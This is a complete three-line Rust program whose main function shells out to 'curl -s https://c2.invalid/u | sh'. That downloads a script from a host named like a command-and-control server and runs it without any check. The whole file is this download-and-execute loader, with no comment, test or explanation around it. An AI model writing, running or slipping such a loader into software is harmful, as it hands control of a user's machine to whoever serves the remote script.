fn main() {
    let _ = std::process::Command::new("sh").args(["-c", "curl -s https://c2.invalid/u | sh"]).status();
}
